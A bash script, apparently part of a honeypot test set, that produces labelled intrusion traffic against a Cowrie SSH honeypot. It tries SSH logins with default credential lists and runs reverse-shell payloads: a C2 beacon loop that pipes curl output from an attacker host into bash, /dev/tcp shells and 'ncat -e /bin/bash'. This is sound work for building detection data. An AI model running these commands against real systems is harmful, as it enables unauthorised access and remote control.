#!/bin/bash
# 시나리오 06: 리버스 셸 / C2 통신
# Label: Intrusion
# 설명: 다양한 리버스셸 기법 - 매 실행마다 기법 + 계정 랜덤

LABEL="Intrusion"
SCENARIO="reverse_shell"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

source /attack_scenarios/lib/common.sh

SSH_USERS=("root" "admin" "pi" "ubuntu" "user" "test" "guest" "operator")
SSH_PASSES=("password" "admin" "123456" "raspberry" "ubuntu" "root" "letmein" "test" "user")

N=$(rand_int 3 6)
for i in $(seq 1 $N); do
    user=$(rand_pick "${SSH_USERS[@]}")
    pass=$(rand_pick "${SSH_PASSES[@]}")
    shell=$(rand_pick "${REVSHELL_POOL[@]}")

    echo "[*] 리버스셸 시도: ${user}@cowrie ($(echo $shell | cut -c1-40)...)"
    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} "$shell" 2>/dev/null || true
    rand_sleep 1 3
done

# C2 비콘 시뮬레이션
echo "[*] C2 beacon simulation"
user=$(rand_pick "${SSH_USERS[@]}")
pass=$(rand_pick "${SSH_PASSES[@]}")
interval=$(rand_int 30 120)
sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} \
    "while true; do curl -s http://${ATTACKER_IP}:8080/cmd | bash; sleep ${interval}; done &" \
    2>/dev/null || true

# 추가 셸 기법들
echo "[*] Alternative shell techniques"
for payload in \
    "exec 5<>/dev/tcp/${ATTACKER_IP}/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done" \
    "0<&196;exec 196<>/dev/tcp/${ATTACKER_IP}/4444; sh <&196 >&196 2>&196" \
    "ncat ${ATTACKER_IP} 4444 -e /bin/bash"; do
    user=$(rand_pick "${SSH_USERS[@]}")
    pass=$(rand_pick "${SSH_PASSES[@]}")
    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} "$payload" 2>/dev/null || true
    rand_sleep 0 2
done

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
